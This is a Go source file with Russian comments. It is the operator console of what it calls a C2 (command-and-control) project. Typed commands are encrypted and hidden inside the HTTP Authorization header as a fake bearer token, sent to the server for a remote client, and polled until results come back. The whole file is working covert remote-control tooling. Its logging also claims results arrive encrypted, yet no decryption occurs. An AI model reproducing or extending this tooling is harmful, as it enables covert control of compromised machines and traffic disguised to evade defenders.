// Package main - терминал оператора.
// Позволяет пользователю вводить команды, отправлять их на C2-сервер
// и получать результаты выполнения.
package main

import (
	"bufio"
	"bytes"
	"c2-project/internal/crypto"
	"c2-project/internal/models"
	"c2-project/internal/protocol"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

// TerminalConfig - структура конфигурации терминала.
// Загружается из файла configs/terminal.json.
type TerminalConfig struct {
	ServerURL string `json:"server_url"`
}

// config - глобальная переменная с настройками терминала.
var config TerminalConfig

// main - точка входа терминала.
func main() {
	// Загружаем конфигурацию из файла.
	if err := loadConfig(); err != nil {
		fmt.Printf("[WARN] Failed to load config: %v\n", err)
		fmt.Println("[INFO] Using default server URL: http://localhost:8080")
		config.ServerURL = "http://localhost:8080"
	}

	// Выводим приветствие и инструкцию.
	fmt.Println("=== C2 Terminal Operator ===")
	fmt.Println("Введите команду или 'exit' для выхода")
	fmt.Println("----------------------------------------")

	// Создаём сканер для чтения ввода с клавиатуры.
	scanner := bufio.NewScanner(os.Stdin)

	// Основной цикл обработки команд.
	for {
		// Выводим приглашение и ждём ввод.
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}

		// Получаем и очищаем введённую команду.
		cmd := strings.TrimSpace(scanner.Text())
		if cmd == "" {
			continue
		}
		// Выход из программы.
		if cmd == "exit" || cmd == "quit" {
			fmt.Println("Выход...")
			break
		}

		// Логируем начало обработки команды.
		fmt.Printf("[INFO] Шифрование команды: %s\n", cmd)
		// Отправляем команду на сервер.
		taskID, err := sendCommand(cmd)
		if err != nil {
			fmt.Printf("[ERROR] %v\n", err)
			continue
		}
		fmt.Printf("[INFO] Команда зашифрована и отправлена на сервер (Task ID: %s)\n", taskID)

		// Ожидаем результат выполнения.
		fmt.Println("[INFO] Ожидание результата...")
		result, err := waitForResult(taskID)
		if err != nil {
			fmt.Printf("[ERROR] %v\n", err)
			continue
		}

		// Выводим полученный результат.
		fmt.Println("=== РЕЗУЛЬТАТ ===")
		fmt.Println(result)
		fmt.Println("==================")
	}
}

// loadConfig - загружает конфигурацию из JSON-файла configs/terminal.json.
func loadConfig() error {
	file, err := os.Open("configs/terminal.json")
	if err != nil {
		return err
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	return decoder.Decode(&config)
}

// sendCommand - отправляет команду на C2-сервер.
// Шифрует команду с помощью AES-GCM и передаёт в заголовке Authorization.
// Возвращает ID созданной задачи.
func sendCommand(cmd string) (string, error) {
	// Создаём структуру задачи.
	task := models.Task{
		ClientID: "client-001",
		Command:  cmd,
		Status:   "pending",
	}

	// Шифруем задачу.
	token, err := protocol.EncodeRequest(task)
	if err != nil {
		return "", err
	}

	// Создаём HTTP-запрос с пустым телом (вся информация в заголовке).
	jsonData, _ := json.Marshal(map[string]interface{}{})

	client := &http.Client{}
	reqHTTP, err := http.NewRequest("POST", config.ServerURL+"/api/tasks", bytes.NewReader(jsonData))
	if err != nil {
		return "", err
	}
	// Передаём зашифрованные данные в заголовке Authorization.
	reqHTTP.Header.Set("Authorization", "Bearer "+token)
	reqHTTP.Header.Set("Content-Type", "application/json")

	// Отправляем запрос.
	resp, err := client.Do(reqHTTP)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Парсим ответ сервера.
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	// Извлекаем ID созданной задачи.
	taskID, _ := result["task_id"].(string)
	return taskID, nil
}

// waitForResult - опрашивает сервер до получения результата.
// Периодически запрашивает статус задачи по ID (до 30 попыток с интервалом 1 секунда).
// При получении результата проверяет, сжат ли он, и при необходимости распаковывает.
func waitForResult(taskID string) (string, error) {
	for i := 0; i < 30; i++ {
		time.Sleep(1 * time.Second)

		// Запрашиваем статус задачи.
		resp, err := http.Get(fmt.Sprintf("%s/api/result?task_id=%s", config.ServerURL, taskID))
		if err != nil {
			continue
		}

		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)
		resp.Body.Close()

		status, _ := result["status"].(string)

		if status == "completed" {
			fmt.Println("[INFO] Получен зашифрованный результат")
			resultText, _ := result["result"].(string)

			// Проверяем, является ли результат сжатым (gzip magic bytes: 1F 8B).
			isCompressed := len(resultText) > 0 && (resultText[0] == '\x1f' || resultText[0] == 0x1f)

			if isCompressed {
				fmt.Println("[INFO] Результат сжат, распаковка...")
				decompressed, err := crypto.Decompress([]byte(resultText))
				if err != nil {
					fmt.Println("[WARN] Не удалось разжать результат, показываю как есть")
					return resultText, nil
				}
				fmt.Println("[INFO] Результат распакован")
				return string(decompressed), nil
			} else {
				fmt.Println("[INFO] Результат не сжат, показываю как есть")
				return resultText, nil
			}
		} else if status == "failed" {
			return "Ошибка выполнения команды", nil
		}
	}
	return "Таймаут: результат не получен за 30 секунд", nil
}
